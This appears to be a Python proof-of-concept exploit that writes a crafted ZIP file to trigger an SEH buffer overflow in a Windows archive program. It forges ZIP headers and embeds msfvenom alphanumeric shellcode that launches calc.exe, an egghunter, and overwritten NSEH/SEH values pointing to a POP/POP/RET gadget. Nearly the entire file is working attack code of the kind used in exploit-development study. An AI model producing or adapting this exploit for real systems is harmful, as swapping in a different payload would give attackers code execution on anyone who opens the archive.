#!/usr/bin/env python
import struct, sys

# Filename
file_name = "hodorlol.zip"

# Variables for headers
file_size = "\xe4\x0f"
dir_size = "\x12\x10\x00\x00"
offset_dir = "\x02\x10\x00\x00"

# Headers
ldf_header = (      "\x50\x4B\x03\x04\x14\x00\x00"
                    "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
                    "\x00\x00\x00\x00\x00\x00\x00\x00"
                     + file_size +
                    "\x00\x00\x00" )

cdf_header = (      "\x50\x4B\x01\x02\x14\x00\x14"
                    "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
                    "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    + file_size +
                    "\x00\x00\x00\x00\x00\x00\x01\x00"
                    "\x24\x00\x00\x00\x00\x00\x00\x00" )

eofcdf_header = (   "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
                     + dir_size + 
                     offset_dir +
                    "\x00\x00" )

# msfvenom -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f python -b "\x00\x0a\x0d\x0f\x14\x15\x2f\x3a\x3b\x5c" -v shellcode bufferregister=edi
# Size 440
shellcode =  ""
shellcode += "\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
shellcode += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shellcode += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
shellcode += "\x42\x75\x4a\x49\x39\x6c\x69\x78\x4c\x42\x55\x50"
shellcode += "\x53\x30\x45\x50\x61\x70\x6c\x49\x7a\x45\x35\x61"
shellcode += "\x59\x50\x63\x54\x4c\x4b\x76\x30\x70\x30\x6c\x4b"
shellcode += "\x76\x32\x54\x4c\x4c\x4b\x31\x42\x72\x34\x4c\x4b"
shellcode += "\x33\x42\x57\x58\x56\x6f\x4e\x57\x63\x7a\x35\x76"
shellcode += "\x44\x71\x69\x6f\x4e\x4c\x77\x4c\x65\x31\x71\x6c"
shellcode += "\x43\x32\x44\x6c\x77\x50\x39\x51\x48\x4f\x56\x6d"
shellcode += "\x33\x31\x78\x47\x6b\x52\x5a\x52\x46\x32\x52\x77"
shellcode += "\x4c\x4b\x76\x32\x46\x70\x6e\x6b\x43\x7a\x67\x4c"
shellcode += "\x6e\x6b\x72\x6c\x52\x31\x62\x58\x69\x73\x31\x58"
shellcode += "\x47\x71\x4e\x31\x56\x31\x6c\x4b\x62\x79\x67\x50"
shellcode += "\x47\x71\x59\x43\x4e\x6b\x37\x39\x45\x48\x49\x73"
shellcode += "\x55\x6a\x32\x69\x4c\x4b\x30\x34\x6c\x4b\x35\x51"
shellcode += "\x68\x56\x75\x61\x4b\x4f\x6e\x4c\x6b\x71\x5a\x6f"
shellcode += "\x56\x6d\x66\x61\x6a\x67\x55\x68\x49\x70\x51\x65"
shellcode += "\x48\x76\x36\x63\x33\x4d\x4a\x58\x45\x6b\x63\x4d"
shellcode += "\x61\x34\x51\x65\x39\x74\x63\x68\x6c\x4b\x73\x68"
shellcode += "\x71\x34\x67\x71\x78\x53\x71\x76\x4c\x4b\x76\x6c"
shellcode += "\x52\x6b\x6e\x6b\x31\x48\x35\x4c\x37\x71\x39\x43"
shellcode += "\x6e\x6b\x37\x74\x4e\x6b\x75\x51\x4a\x70\x4d\x59"
shellcode += "\x57\x34\x35\x74\x47\x54\x71\x4b\x73\x6b\x53\x51"
shellcode += "\x51\x49\x53\x6a\x73\x61\x49\x6f\x6b\x50\x63\x6f"
shellcode += "\x43\x6f\x33\x6a\x6e\x6b\x65\x42\x6a\x4b\x4e\x6d"
shellcode += "\x33\x6d\x33\x5a\x55\x51\x6e\x6d\x6b\x35\x4d\x62"
shellcode += "\x47\x70\x33\x30\x57\x70\x42\x70\x55\x38\x65\x61"
shellcode += "\x4c\x4b\x72\x4f\x6d\x57\x59\x6f\x4e\x35\x4f\x4b"
shellcode += "\x6c\x30\x6c\x75\x6e\x42\x62\x76\x35\x38\x6f\x56"
shellcode += "\x4c\x55\x4f\x4d\x6d\x4d\x4b\x4f\x78\x55\x37\x4c"
shellcode += "\x77\x76\x43\x4c\x34\x4a\x4f\x70\x69\x6b\x39\x70"
shellcode += "\x30\x75\x34\x45\x4f\x4b\x51\x57\x34\x53\x74\x32"
shellcode += "\x32\x4f\x53\x5a\x55\x50\x46\x33\x4b\x4f\x6e\x35"
shellcode += "\x55\x33\x73\x51\x50\x6c\x43\x53\x76\x4e\x70\x65"
shellcode += "\x64\x38\x42\x45\x45\x50\x41\x41"

# Chars that prohibit opening ZIP: 0x00 0x0a 0x0d 0x0f 0x14 0x15 0x2f 0x3a 0x3b 0x5c
goodchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x10\x11\x12\x13\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23"
"\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46"
"\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87"
"\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7"
"\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7"
"\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7"
"\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x10\x11\x12\x13\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25"
"\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48"
"\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69"
"\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89"
"\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9"
"\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9"
"\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9"
"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

# Egghunter "ODOR" ASCII encoded with bufferregister EDI due to JMP EDI via egghunter
# msfvenom -p generic/custom PAYLOADFILE=egghunter.bin -e x86/alpha_mixed BufferRegister=ESI -b "\x00\x0a\x0d\x0f\x14\x15\x2f\x3a\x3b\x5c" -a x86 -f python -v egghunt --platform Windows
egghunt =  ""
egghunt += "\x56\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
egghunt += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
egghunt += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
egghunt += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
egghunt += "\x42\x75\x4a\x49\x52\x46\x4d\x51\x6b\x7a\x39\x6f"
egghunt += "\x64\x4f\x62\x62\x63\x62\x51\x7a\x64\x42\x53\x68"
egghunt += "\x4a\x6d\x36\x4e\x57\x4c\x34\x45\x70\x5a\x70\x74"
egghunt += "\x7a\x4f\x4d\x68\x71\x42\x70\x4f\x37\x34\x42\x6f"
egghunt += "\x6e\x6b\x69\x6a\x4e\x4f\x64\x35\x78\x6a\x6c\x6f"
egghunt += "\x61\x65\x4b\x57\x69\x6f\x6a\x47\x41\x41"

# Eggstring
egg = "ODOR"[::-1] * 2

# GetPC ESI method to align ESP and stack
getpc = (
            "\x89\x05"                                  # jmp short (5 bytes) to 'jmp back' at end
            "\x5e"                                      # pop esi
            "\x41"                                      # nop (inc ecx)
            "\x98\x99"                                  # call esi
            "\x41"                                      # nop (inc ecx)
            "\x8a\x94\x98\x98\x98"                      # jmp back to pop esi
)

# Negative jump
# E96AFCFFFF        jmp 0xfffffc6f
neg_jmp = (
            "\x82\xdf\x81\x98\x98"                      # jmp 0xfffffc6f
)

# Lengths and offsets
maxlen = 4068
ret_jmp_1 = 901
ret_jmp_2 = 57

# Crashes
crash_nseh = 1022
crash_seh = crash_nseh + 4

# Create characters and string to craft
# Stage 2: Padding and place GetPC for aligning stack and egghunt, also some additional padding
stage2 = "A" * ret_jmp_2
stage2 += badchars
stage2 += egghunt
stage2 += "B" * (ret_jmp_1 - len(stage2))
# Stage 1: Place chars to perform negative jump on stack and some offset padding
stage1 = neg_jmp
stage1 += "C" * (crash_nseh - len(stage1 + stage2))
# NSEH / SEH
nseh = struct.pack("<L", 0x9f89e8e8)                    # 0x83eb4646: 0x9f89e8e8, e8 converts to 46 as filler. results in: INC ESI # INC ESI # JMP SHORT 0xffffff87
seh = struct.pack("<L", 0x0041189b)                     # 0x004118a2: 9b == a2 converted # POP/POP/RET # zip4.exe
# Suffix as filler
suffix = ""
suffix += "D" * (maxlen - len(stage2 + stage1 + nseh + seh))

# Construct crafted payload
payload = stage2 + stage1 + nseh + seh + suffix

# Check if size matches
if len(payload) != 4068:
    print("[!] Warning, payload size isn't correct!")

# Craft final string to save as file
# Added egg and shellcode as code to detect via egghunter
exploit = ldf_header + payload + cdf_header + payload + eofcdf_header + egg + shellcode

print("Size : {s}".format(s=len(payload)))
with open(file_name, 'w') as f:
    f.write(exploit)
